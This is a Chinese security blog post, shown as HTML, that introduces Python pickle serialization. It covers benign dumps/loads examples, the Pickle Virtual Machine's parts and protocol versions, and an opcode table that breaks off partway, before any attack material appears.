

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Tr0y">
  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, åšå®¢, ä¿¡æ¯å®‰å…¨">
  
    <meta name="description" content="å±…å®¶éš”ç¦»å®åœ¨æ˜¯å¤ªæ— èŠäº†ï¼Œæ›´ä¸€ç¯‡æ–‡ç« å§ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="SecMap - ååºåˆ—åŒ–ï¼ˆPythonï¼‰">
<meta property="og:url" content="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">
<meta property="og:site_name" content="Tr0y&#39;s Blog">
<meta property="og:description" content="å±…å®¶éš”ç¦»å®åœ¨æ˜¯å¤ªæ— èŠäº†ï¼Œæ›´ä¸€ç¯‡æ–‡ç« å§ã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/secmap.jpg/cover">
<meta property="article:published_time" content="2022-02-03T18:00:00.000Z">
<meta property="article:modified_time" content="2025-04-15T14:01:31.000Z">
<meta property="article:author" content="Tr0y">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="SecMap">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/secmap.jpg/cover">
  
  
  
  <title>SecMap - ååºåˆ—åŒ–ï¼ˆPythonï¼‰ - Tr0y&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/my.css">
<link rel="stylesheet" href="/css/my-piczoom.css">
<link rel="stylesheet" href="/css/my-code.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"ä¸¨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"ğŸŒ§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  

  

  
    
  



  
<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Tr0y&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-books"></i>
                ç”Ÿå‘½çº¿
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-archive-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/gallery/">
                <i class="iconfont icon-images"></i>
                æ‘„å½±é›†
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="SecMap - ååºåˆ—åŒ–ï¼ˆPythonï¼‰"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-02-03 18:00" pubdate>
          2022å¹´2æœˆ3æ—¥ 18:00:00
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          27k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          169 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="ç»éªŒæ€»ç»“"
        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
        aria-expanded="true"
      >
        ç»éªŒæ€»ç»“
        <span class="list-group-count">(85)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
        
        
          
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2021/12/31/2021/" title="2021 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2021/01/12/flag-in-2021/" title="2021ï¼Œæ¥ç«‹äº› flag å§"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021ï¼Œæ¥ç«‹äº› flag å§</span>
        </a>
      
    
      
      
        <a href="/2023/01/31/2022/" title="2022 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2022 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2024/03/15/2023/" title="2023 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 äº‘å—ä¹‹æ—…"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 äº‘å—ä¹‹æ—…</span>
        </a>
      
    
      
      
        <a href="/2025/03/14/2024/" title="2024 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 ğŸ‡«ğŸ‡¯ æ–æµä¹‹æ—…"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 ğŸ‡«ğŸ‡¯ æ–æµä¹‹æ—…</span>
        </a>
      
    
      
      
        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF æŒ‡åŒ—"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CSRF æŒ‡åŒ—</span>
        </a>
      
    
      
      
        <a href="/2017/06/07/CtfMiscStega/" title="CTF æ‚é¡¹ä¹‹éšå†™æœ¯"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CTF æ‚é¡¹ä¹‹éšå†™æœ¯</span>
        </a>
      
    
      
      
        <a href="/2020/09/14/DNS-1-basic/" title="DNS å®‰å…¨ï¼ˆä¸€ï¼‰ï¼šåŸºç¡€çŸ¥è¯†å¤ä¹ "
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">DNS å®‰å…¨ï¼ˆä¸€ï¼‰ï¼šåŸºç¡€çŸ¥è¯†å¤ä¹ </span>
        </a>
      
    
      
      
        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
          <span class="category-post">More...</span>
        </a>
        
  </div>

          
  
    
    
    
    <div class="category-sub row nomargin-x">
      <a class="category-subitem collapsed
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="è¿‡ç¨‹è®°å½•"
        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
        aria-expanded="false"
      >
        è¿‡ç¨‹è®°å½•
        <span class="list-group-count">(1)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 å¼ºç½‘æ¯ä¸‰é“ pyjail çš„é¢˜è§£"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 å¼ºç½‘æ¯ä¸‰é“ pyjail çš„é¢˜è§£</span>
        </a>
      
    
  </div>

        
      </div>
    </div>
  
        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">SecMap - ååºåˆ—åŒ–ï¼ˆPythonï¼‰</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2 ä¸ªæœˆå‰
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>å±…å®¶éš”ç¦»å®åœ¨æ˜¯å¤ªæ— èŠäº†ï¼Œæ›´ä¸€ç¯‡æ–‡ç« å§ã€‚</p>
<span id="more"></span>
<h2 id="ä»‹ç»">ä»‹ç»</h2>
<p>ä¸ PHP ååºåˆ—åŒ–ç±»ä¼¼ï¼ŒPython ååºåˆ—åŒ–ä¹Ÿæ˜¯ä¸ºäº†è§£å†³å¯¹è±¡ä¼ è¾“ä¸æŒä¹…åŒ–å­˜å‚¨é—®é¢˜ã€‚</p>
<h3 id="ç›¸å…³åº“å’Œæ–¹æ³•">ç›¸å…³åº“å’Œæ–¹æ³•</h3>
<p>åœ¨ Python ä¸­å†…ç½®äº†æ ‡å‡†åº“ <code>pickle</code>/<code>cPickle</code>ï¼ˆ3.x æ”¹åä¸º <code>_pickle</code>ï¼‰ï¼Œç”¨äºåºåˆ—åŒ–/ååºåˆ—åŒ–çš„å„ç§æ“ä½œï¼ˆPython çš„å®˜æ–¹æ–‡æ¡£ä¸­ï¼Œç§°å…¶ä¸º å°å­˜/è§£å°ï¼Œæ„æ€å…¶å®å·®ä¸å¤šï¼‰ï¼Œæ¯”è¾ƒå¸¸è§çš„å½“ç„¶æ˜¯ <code>dumps</code>ï¼ˆåºåˆ—åŒ–ï¼‰å’Œ <code>loads</code>ï¼ˆååºåˆ—åŒ–ï¼‰å•¦ã€‚å…¶ä¸­ <code>pickle</code> æ˜¯ç”¨ Python å†™çš„ï¼Œ<code>cPickle</code> æ˜¯ç”¨ C è¯­è¨€å†™çš„ï¼Œé€Ÿåº¦å¾ˆå¿«ï¼Œä½†æ˜¯å®ƒä¸å…è®¸ç”¨æˆ·ä» <code>pickle</code> æ´¾ç”Ÿå­ç±»ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.a = <span class="hljs-number">1</span><br><br><br>test = Test()<br><br>serialized = pickle.dumps(test)<br><span class="hljs-built_in">print</span>(serialized)<br><br>unserialized = pickle.loads(serialized)<br><span class="hljs-built_in">print</span>(unserialized.a)<br></code></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š<br />
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>80<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>95&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>08__main__<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>04Test<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>93<span class="hljs-char escape_">\x</span>94)<span class="hljs-char escape_">\x</span>81<span class="hljs-char escape_">\x</span>94&#125;<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>01a<span class="hljs-char escape_">\x</span>94K<span class="hljs-char escape_">\x</span>01sb.&#x27;</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></p>
<p>ç¬¬ä¸€è¡Œçœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Ÿé©¬ä¸Šè¯´åˆ°ã€‚</p>
<h3 id="pvm">PVM</h3>
<p>è¦å¯¹åºåˆ—åŒ–ã€ååºåˆ—åŒ–å¾ˆæ¸…æ¥šçš„è¯ï¼Œä¸€å®šè¦äº†è§£ PVMï¼Œè¿™èƒŒååˆæœ‰éå¸¸å¤šçš„ç»†èŠ‚ã€‚</p>
<p>é¦–å…ˆï¼Œåœ¨è°ƒç”¨ pickle çš„æ—¶å€™ï¼Œå®é™…ä¸Šæ˜¯ <code>class pickle.Pickler</code> å’Œ <code>class pickle.Unpickler</code> åœ¨èµ·ä½œç”¨ï¼Œè€Œè¿™ä¸¤ä¸ªç±»åˆæ˜¯ä¾é  Pickle Virtual Machine(PVM)ï¼Œåœ¨æ›´æ·±å±‚å¯¹è¾“å…¥è¿›è¡Œç€æŸç§æ“ä½œï¼Œä»è€Œæœ€åå¾—åˆ°äº†é‚£ä¸²å¤æ‚çš„ç»“æœã€‚</p>
<p>PVM ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p>
<ol type="1">
<li>æŒ‡ä»¤å¤„ç†å™¨ï¼šä»æµä¸­è¯»å– opcode å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° <code>.</code> è¿™ä¸ªç»“æŸç¬¦ååœæ­¢ï¼ˆçœ‹ä¸Šé¢çš„ä»£ç ç¤ºä¾‹ï¼Œåºåˆ—åŒ–ä¹‹åçš„ç»“æœæœ€åæ˜¯ <code>.</code>ï¼‰ã€‚æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼š
<ol type="1">
<li>opcode æ˜¯å•å­—èŠ‚çš„</li>
<li>å¸¦å‚æ•°çš„æŒ‡ä»¤ç”¨æ¢è¡Œç¬¦æ¥ç¡®å®šè¾¹ç•Œ</li>
</ol></li>
<li>æ ˆåŒºï¼šç”¨ list å®ç°çš„ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚</li>
<li>å†…å­˜åŒºï¼šç”¨ dict å®ç°çš„ï¼Œä¸º PVM çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ã€‚</li>
</ol>
<p>æœ€åï¼ŒPVM è¿˜æœ‰åè®®ä¸€è¯´ï¼Œè¿™é‡Œçš„åè®®æŒ‡å®šäº†åº”è¯¥é‡‡ç”¨ä»€ä¹ˆæ ·çš„åºåˆ—åŒ–ã€ååºåˆ—åŒ–ç®—æ³•ã€‚</p>
<h4 id="pvm-åè®®">PVM åè®®</h4>
<p>å½“å‰å…±æœ‰ 6 ç§ä¸åŒçš„åè®®å¯ç”¨ï¼Œä½¿ç”¨çš„åè®®ç‰ˆæœ¬è¶Šé«˜ï¼Œè¯»å–æ‰€ç”Ÿæˆ pickle å¯¹è±¡æ‰€éœ€çš„ Python ç‰ˆæœ¬å°±è¦è¶Šæ–°ã€‚</p>
<ol type="1">
<li>v0 ç‰ˆåè®®æ˜¯åŸå§‹çš„â€œäººç±»å¯è¯»â€åè®®ï¼Œå¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„ Python</li>
<li>v1 ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„ Python å…¼å®¹</li>
<li>v2 ç‰ˆåè®®æ˜¯åœ¨ Python 2.3 ä¸­åŠ å…¥çš„ï¼Œå®ƒä¸ºå­˜å‚¨ new-style class æä¾›äº†æ›´é«˜æ•ˆçš„æœºåˆ¶ï¼ˆå‚è€ƒ PEP 307ï¼‰ã€‚</li>
<li>v3 ç‰ˆåè®®æ˜¯åœ¨ Python 3.0 ä¸­åŠ å…¥çš„ï¼Œå®ƒæ˜¾å¼åœ°æ”¯æŒ bytes å­—èŠ‚å¯¹è±¡ï¼Œä¸èƒ½ä½¿ç”¨ Python 2.x è§£å°ã€‚è¿™æ˜¯ Python 3.0-3.7 çš„é»˜è®¤åè®®ã€‚</li>
<li>v4 ç‰ˆåè®®æ·»åŠ äº Python 3.4ã€‚å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡ï¼Œèƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡ï¼Œè¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–ï¼ˆå‚è€ƒ PEP 3154ï¼‰ã€‚å®ƒæ˜¯ Python 3.8 ä½¿ç”¨çš„é»˜è®¤åè®®ã€‚</li>
<li>v5 ç‰ˆåè®®æ˜¯åœ¨ Python 3.8 ä¸­åŠ å…¥çš„ã€‚å®ƒå¢åŠ äº†å¯¹å¸¦å¤–æ•°æ®çš„æ”¯æŒï¼Œå¹¶å¯åŠ é€Ÿå¸¦å†…æ•°æ®å¤„ç†ï¼ˆå‚è€ƒ PEP 574ï¼‰ã€‚</li>
</ol>
<p>ä¸Šé¢é‚£ä¸ªä»£ç ç¤ºä¾‹ï¼Œæˆ‘ç”¨çš„æ˜¯ py3.8ï¼Œå¦‚æœè¦å¾—åˆ°æ˜“è¯»çš„åºåˆ—åŒ–ç»“æœï¼Œåœ¨ dumps ä¸­æŒ‡å®šåè®®ç‰ˆæœ¬å³å¯ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.a = <span class="hljs-number">1</span><br><br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)  <span class="hljs-comment"># æŒ‡å®šç‰ˆæœ¬</span><br><span class="hljs-built_in">print</span>(serialized)<br><br>unserialized = pickle.loads(serialized)  <span class="hljs-comment"># æ³¨æ„ï¼Œloads èƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«ååºåˆ—åŒ–çš„ç‰ˆæœ¬</span><br><span class="hljs-built_in">print</span>(unserialized.a)<br></code></pre></td></tr></table></figure><br />
ç»“æœå¦‚ä¸‹ï¼š<br />
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;ccopy_reg<span class="hljs-char escape_">\n</span>_reconstructor<span class="hljs-char escape_">\n</span>p0<span class="hljs-char escape_">\n</span>(c__main__<span class="hljs-char escape_">\n</span>Test<span class="hljs-char escape_">\n</span>p1<span class="hljs-char escape_">\n</span>c__builtin__<span class="hljs-char escape_">\n</span>object<span class="hljs-char escape_">\n</span>p2<span class="hljs-char escape_">\n</span>Ntp3<span class="hljs-char escape_">\n</span>Rp4<span class="hljs-char escape_">\n</span>(dp5<span class="hljs-char escape_">\n</span>Va<span class="hljs-char escape_">\n</span>p6<span class="hljs-char escape_">\n</span>I1<span class="hljs-char escape_">\n</span>sb.&#x27;</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></p>
<p>åœ¨åºåˆ—åŒ–æ—¶ï¼Œåè®®ç‰ˆæœ¬æ˜¯è‡ªåŠ¨æ£€æµ‹å‡ºæ¥çš„ï¼Œæ‰€ä»¥è¯¸å¦‚ loads æ–¹æ³•æ˜¯ä¸éœ€è¦å‚æ•°æ¥æŒ‡å®šåè®®çš„ã€‚</p>
<p>ç”±äºä¸åŒç‰ˆæœ¬åœ¨åˆ©ç”¨çš„æ—¶å€™æ²¡æœ‰å¾ˆå¤§åŒºåˆ«ï¼Œæ‰€ä»¥æœ¬æ–‡ä»¥æœ€æ˜“è¯»çš„ v0 åè®®ä¸ºä¾‹ã€‚</p>
<h4 id="opcode">opcode</h4>
<p>opcode æ˜¯ PVM çš„çµé­‚ï¼Œæ§åˆ¶æ•´ä¸ªæµç¨‹çš„è¿è¡Œã€‚å¸¸ç”¨çš„æˆ‘ç»™ç¿»è¯‘äº†ä¸€ä¸‹ï¼Œå„ä½ç°æŸ¥ç°ç”¨å¥½äº†ã€‚<br />
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs txt">MARK           = b&#x27;(&#x27;   # å‘æ ˆä¸­å‹å…¥ä¸€ä¸ª MARK æ ‡è®°<br>STOP           = b&#x27;.&#x27;   # ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸º pickle.loads() çš„è¿”å›å€¼<br>POP            = b&#x27;0&#x27;   # ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡<br>POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject<br>DUP            = b&#x27;2&#x27;   # duplicate top stack item<br>FLOAT          = b&#x27;F&#x27;   # å®ä¾‹åŒ–ä¸€ä¸ª float å¯¹è±¡<br>INT            = b&#x27;I&#x27;   # å®ä¾‹åŒ–ä¸€ä¸ª int æˆ–è€… bool å¯¹è±¡<br>BININT         = b&#x27;J&#x27;   # push four-byte signed int<br>BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int<br>LONG           = b&#x27;L&#x27;   # push long; decimal string argument<br>BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int<br>NONE           = b&#x27;N&#x27;   # æ ˆä¸­å‹å…¥ None<br>PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg<br>BINPERSID      = b&#x27;Q&#x27;   # push persistent object; id is taken from stack<br>REDUCE         = b&#x27;R&#x27;   # ä»æ 